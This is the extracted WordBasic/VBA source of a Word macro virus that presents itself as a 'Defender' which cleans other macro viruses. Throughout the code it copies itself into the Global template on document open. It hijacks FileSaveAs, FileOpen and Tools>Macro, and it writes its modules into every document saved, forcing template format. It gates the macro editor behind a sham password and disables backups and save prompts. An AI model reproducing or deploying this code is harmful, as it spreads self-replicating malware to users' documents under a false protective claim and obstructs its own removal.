   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "AutoOpen"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
   Dim FoundVirus
   Dim TellUser$
   Dim iMacroCount
   Dim i
   Dim eAAAZAO
   Dim eAAAZFS
   Dim eFilePrint
   Dim eFilePrintDefault
   Dim eFileSave
   Dim eCloseUpData
   Dim eFileConvertText
   Dim iWW6IInstance
   Dim sMe$
   Dim sMacro$
   Dim NumberOfVirus$
       On Error GoTo -1: On Error GoTo ErrHandler
       FoundVirus = 0
       TellUser$ = " virus macro(s) have been detected and removed from the Global Template"

   'Initialize Word settings
   WordBasic.ToolsCustomizeMenus ResetAll:=1, Context:=0
   WordBasic.ToolsOptionsSave CreateBackup:=0, FastSaves:=0, SummaryPrompt:=0, GlobalDotPrompt:=0, NativePictureFormat:=0, EmbedFonts:=0, FormsData:=0, AutoSave:=1, SaveInterval:="7", Password:="", WritePassword:="", RecommendReadOnly:=0
   WordBasic.ToolsOptionsGeneral Pagination:=1, WPHelp:=0, WPDocNavKeys:=0, BlueScreen:=0, ErrorBeeps:=1, Effects3d:=1, UpdateLinks:=1, SendMailAttach:=1, RecentFiles:=0, RecentFileCount:="", Units:=1, ButtonFieldClicks:=-1

   SearchForMacroVirus:

       iMacroCount = WordBasic.CountMacros(0, 0)
       'Search the Global Template for virus macros
       For i = 1 To iMacroCount
           If WordBasic.[MacroName$](i) = "AAAZAO" Then
                   eAAAZAO = -1
           End If
           If WordBasic.[MacroName$](i) = "AAAZFS" Then
                   eAAAZFS = -1
           End If
           If WordBasic.[MacroName$](i) = "FilePrint" Then
                   eFilePrint = -1
           End If
           If WordBasic.[MacroName$](i) = "FilePrintDefault" Then
                   eFilePrintDefault = -1
           End If
           If WordBasic.[MacroName$](i) = "FileSave" Then
                   eFileSave = -1
           End If
           If WordBasic.[MacroName$](i) = "CloseUpData" Then
                   eCloseUpData = -1
           End If
           If WordBasic.[MacroName$](i) = "FileConvertText" Then
                   eFileConvertText = -1
           End If

       Next i

   CleanVirusMacro:

       If eFileConvertText = -1 Then
       FoundVirus = FoundVirus + Clean("FileConvertText")
       End If
       If eCloseUpData = -1 Then
       FoundVirus = FoundVirus + Clean("CloseUpData")
       End If
       If eFilePrintDefault = -1 Then
       FoundVirus = FoundVirus + Clean("FilePrintDefault")
       End If
       If eFilePrint = -1 Then
       FoundVirus = FoundVirus + Clean("FilePrint")
       End If
       If eFileSave = -1 Then
       FoundVirus = FoundVirus + Clean("FileSave")
       End If
       If eAAAZAO = -1 Then
       FoundVirus = FoundVirus + Clean("AAAZAO")
       End If
       If eAAAZFS = -1 Then
       FoundVirus = FoundVirus + Clean("AAAZFS")
       End If

   '*******************************************************************
   InstallDefender:
           iWW6IInstance = WordBasic.Val(WordBasic.[GetDocumentVar$]("WW6Defender"))
           sMe$ = WordBasic.[FileName$]()
           sMacro$ = sMe$ + ":Module1"
           WordBasic.MacroCopy sMacro$, "Global:Module1"
           sMacro$ = sMe$ + ":Module2"
           WordBasic.MacroCopy sMacro$, "Global:Module2"
           sMacro$ = sMe$ + ":Module2"
           WordBasic.MacroCopy sMacro$, "Global:FileSaveAs"
           sMacro$ = sMe$ + ":Module3"
           WordBasic.MacroCopy sMacro$, "Global:ToolsMacro"
           sMacro$ = sMe$ + ":Module4"
           WordBasic.MacroCopy sMacro$, "Global:FileOpen"
           sMacro$ = sMe$ + ":Defend"
           WordBasic.MacroCopy sMacro$, "Global:Defender"
           WordBasic.SetProfileString "WW6I", Str(iWW6IInstance + 1)
   '*******************************************************************


   'Acknowledge user if Global Template is infected
   If FoundVirus > 0 Then
   NumberOfVirus$ = Str(FoundVirus)
   TellUser$ = NumberOfVirus$ + TellUser$
   WordBasic.MsgBox TellUser$, "Defender", 64
   End If

   GoTo Done

   ErrHandler:
   If Not Err.Number <> 53 Then
   WordBasic.MsgBox "WARNING: Active macro virus found. Defender will now exit Word. You must then restart Word and try to load the document again", "Defender", 48
   WordBasic.ToolsOptionsSave CreateBackup:=0, FastSaves:=0, SummaryPrompt:=0, GlobalDotPrompt:=0, NativePictureFormat:=0, EmbedFonts:=0, FormsData:=0, AutoSave:=1, SaveInterval:="7", Password:="", WritePassword:="", RecommendReadOnly:=0
   WordBasic.FileExit
   Else
   GoTo InstallDefender
   End If
   Done:
   WordBasic.PrintStatusBar "Defender has been installed successfully"

   Abort:
   End Sub

   Private Function Clean(Virus$)
   Dim SourceName$
       On Error GoTo -1: On Error GoTo ErrHandler
       Clean = 0
       SourceName$ = WordBasic.[MacroFileName$](Virus$)
       If SourceName$ <> "" And SourceName$ <> "Built In" Then
           WordBasic.Organizer Delete:=1, Source:=SourceName$, Name:=Virus$, Tab:=3
           Clean = 1
       Else: GoTo InstallDefender
       End If

   ErrHandler:
   If Err.Number = 53 Then
   WordBasic.MsgBox "WARNING: Active macro virus found. Defender will now exit Word. You must then restart Word and try to load the document again", "Defender", 48
   WordBasic.ToolsOptionsSave CreateBackup:=0, FastSaves:=0, SummaryPrompt:=0, GlobalDotPrompt:=0, NativePictureFormat:=0, EmbedFonts:=0, FormsData:=0, AutoSave:=1, SaveInterval:="7", Password:="", WritePassword:="", RecommendReadOnly:=0
   WordBasic.FileExit
   End If

   Abort:
   End Function

   Attribute VB_Name = "Module3"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Runs, creates, deletes, or revises a macro"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Module3.MAIN"
   Dim Password$
   WordBasic.PrintStatusBar "Runs, creates, deletes, or revises a macro"
   On Error GoTo -1: On Error GoTo Abort
   WordBasic.ToolsOptionsSave CreateBackup:=0, FastSaves:=0, SummaryPrompt:=0, GlobalDotPrompt:=0, NativePictureFormat:=0, EmbedFonts:=0, FormsData:=0, AutoSave:=1, SaveInterval:="7", Password:="", WritePassword:="", RecommendReadOnly:=0
   Password$ = "Password"

   GetPassword:
   Password$ = WordBasic.[InputBox$]("Restricted area. Please Enter your password", "Defender", Password$)

   While Not Password$ = WordBasic.[FileName$]()
   WordBasic.MsgBox "Password incorrect. Access denied", "Defender", 16
   GoTo GetPassword
   Wend

   Pass:
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.ToolsMacro(False)
   WordBasic.CurValues.ToolsMacro dlg
   WordBasic.Dialog.ToolsMacro dlg
   WordBasic.ToolsMacro dlg

   Abort:
   End Sub

   Attribute VB_Name = "Module2"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Module2.MAIN"
   Dim sMe$
   Dim sTMacro$
   'FileSaveAs

   ProtectSave:
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   On Error GoTo -1: On Error GoTo Abort
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   If dlg.Format = 0 Then dlg.Format = 1
   sMe$ = WordBasic.[FileName$]()
   sTMacro$ = sMe$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:Module1", sTMacro$
   sTMacro$ = sMe$ + ":Module1"
   WordBasic.MacroCopy "Global:Module1", sTMacro$
   sTMacro$ = sMe$ + ":Module2"
   WordBasic.MacroCopy "Global:Module2", sTMacro$
   sTMacro$ = sMe$ + ":Module3"
   WordBasic.MacroCopy "Global:ToolsMacro", sTMacro$
   sTMacro$ = sMe$ + ":Module4"
   WordBasic.MacroCopy "Global:FileOpen", sTMacro$
   sTMacro$ = sMe$ + ":Defend"
   WordBasic.MacroCopy "Global:Defender", sTMacro$
   WordBasic.FileSaveAs dlg
   GoTo Done
   'End If

   Abort:
   If Err.Number <> 102 Then
       WordBasic.FileSaveAs dlg
   End If

   Done:
   End Sub

   Attribute VB_Name = "Module1"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "AutoOpen"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Module1.MAIN"
   Dim FoundVirus
   Dim TellUser$
   Dim iMacroCount
   Dim i
   Dim eAAAZAO
   Dim eAAAZFS
   Dim eFilePrint
   Dim eFilePrintDefault
   Dim eFileSave
   Dim eCloseUpData
   Dim eFileConvertText
   Dim iWW6IInstance
   Dim sMe$
   Dim sMacro$
   Dim NumberOfVirus$
       On Error GoTo -1: On Error GoTo ErrHandler
       FoundVirus = 0
       TellUser$ = " virus macro(s) have been detected and removed from the Global Template"

   'Initialize Word settings
   WordBasic.ToolsCustomizeMenus ResetAll:=1, Context:=0
   WordBasic.ToolsOptionsSave CreateBackup:=0, FastSaves:=0, SummaryPrompt:=0, GlobalDotPrompt:=0, NativePictureFormat:=0, EmbedFonts:=0, FormsData:=0, AutoSave:=1, SaveInterval:="7", Password:="", WritePassword:="", RecommendReadOnly:=0
   WordBasic.ToolsOptionsGeneral Pagination:=1, WPHelp:=0, WPDocNavKeys:=0, BlueScreen:=0, ErrorBeeps:=1, Effects3d:=1, UpdateLinks:=1, SendMailAttach:=1, RecentFiles:=0, RecentFileCount:="", Units:=1, ButtonFieldClicks:=-1

   SearchForMacroVirus:

       iMacroCount = WordBasic.CountMacros(0, 0)
       'Search the Global Template for virus macros
       For i = 1 To iMacroCount
           If WordBasic.[MacroName$](i) = "AAAZAO" Then
                   eAAAZAO = -1
           End If
           If WordBasic.[MacroName$](i) = "AAAZFS" Then
                   eAAAZFS = -1
           End If
           If WordBasic.[MacroName$](i) = "FilePrint" Then
                   eFilePrint = -1
           End If
           If WordBasic.[MacroName$](i) = "FilePrintDefault" Then
                   eFilePrintDefault = -1
           End If
           If WordBasic.[MacroName$](i) = "FileSave" Then
                   eFileSave = -1
           End If
           If WordBasic.[MacroName$](i) = "CloseUpData" Then
                   eCloseUpData = -1
           End If
           If WordBasic.[MacroName$](i) = "FileConvertText" Then
                   eFileConvertText = -1
           End If

       Next i

   CleanVirusMacro:

       If eFileConvertText = -1 Then
       FoundVirus = FoundVirus + Clean("FileConvertText")
       End If
       If eCloseUpData = -1 Then
       FoundVirus = FoundVirus + Clean("CloseUpData")
       End If
       If eFilePrintDefault = -1 Then
       FoundVirus = FoundVirus + Clean("FilePrintDefault")
       End If
       If eFilePrint = -1 Then
       FoundVirus = FoundVirus + Clean("FilePrint")
       End If
       If eFileSave = -1 Then
       FoundVirus = FoundVirus + Clean("FileSave")
       End If
       If eAAAZAO = -1 Then
       FoundVirus = FoundVirus + Clean("AAAZAO")
       End If
       If eAAAZFS = -1 Then
       FoundVirus = FoundVirus + Clean("AAAZFS")
       End If

   '*******************************************************************
   InstallDefender:
           iWW6IInstance = WordBasic.Val(WordBasic.[GetDocumentVar$]("WW6Defender"))
           sMe$ = WordBasic.[FileName$]()
           sMacro$ = sMe$ + ":Module1"
           WordBasic.MacroCopy sMacro$, "Global:Module1"
           sMacro$ = sMe$ + ":Module2"
           WordBasic.MacroCopy sMacro$, "Global:Module2"
           sMacro$ = sMe$ + ":Module2"
           WordBasic.MacroCopy sMacro$, "Global:FileSaveAs"
           sMacro$ = sMe$ + ":Module3"
           WordBasic.MacroCopy sMacro$, "Global:ToolsMacro"
           sMacro$ = sMe$ + ":Module4"
           WordBasic.MacroCopy sMacro$, "Global:FileOpen"
           sMacro$ = sMe$ + ":Defend"
           WordBasic.MacroCopy sMacro$, "Global:Defender"
           WordBasic.SetProfileString "WW6I", Str(iWW6IInstance + 1)
   '*******************************************************************


   'Acknowledge user if Global Template is infected
   If FoundVirus > 0 Then
   NumberOfVirus$ = Str(FoundVirus)
   TellUser$ = NumberOfVirus$ + TellUser$
   WordBasic.MsgBox TellUser$, "Defender", 64
   End If

   GoTo Done

   ErrHandler:
   If Not Err.Number <> 53 Then
   WordBasic.MsgBox "WARNING: Active macro virus found. Defender will now exit Word. You must then restart Word and try to load the document again", "Defender", 48
   WordBasic.ToolsOptionsSave CreateBackup:=0, FastSaves:=0, SummaryPrompt:=0, GlobalDotPrompt:=0, NativePictureFormat:=0, EmbedFonts:=0, FormsData:=0, AutoSave:=1, SaveInterval:="7", Password:="", WritePassword:="", RecommendReadOnly:=0
   WordBasic.FileExit
   Else
   GoTo InstallDefender
   End If
   Done:
   WordBasic.PrintStatusBar "Defender has been installed successfully"

   Abort:
   End Sub

   Private Function Clean(Virus$)
   Dim SourceName$
       On Error GoTo -1: On Error GoTo ErrHandler
       Clean = 0
       SourceName$ = WordBasic.[MacroFileName$](Virus$)
       If SourceName$ <> "" And SourceName$ <> "Built In" Then
           WordBasic.Organizer Delete:=1, Source:=SourceName$, Name:=Virus$, Tab:=3
           Clean = 1
       Else: GoTo InstallDefender
       End If

   ErrHandler:
   If Err.Number = 53 Then
   WordBasic.MsgBox "WARNING: Active macro virus found. Defender will now exit Word. You must then restart Word and try to load the document again", "Defender", 48
   WordBasic.ToolsOptionsSave CreateBackup:=0, FastSaves:=0, SummaryPrompt:=0, GlobalDotPrompt:=0, NativePictureFormat:=0, EmbedFonts:=0, FormsData:=0, AutoSave:=1, SaveInterval:="7", Password:="", WritePassword:="", RecommendReadOnly:=0
   WordBasic.FileExit
   End If

   Abort:
   End Function
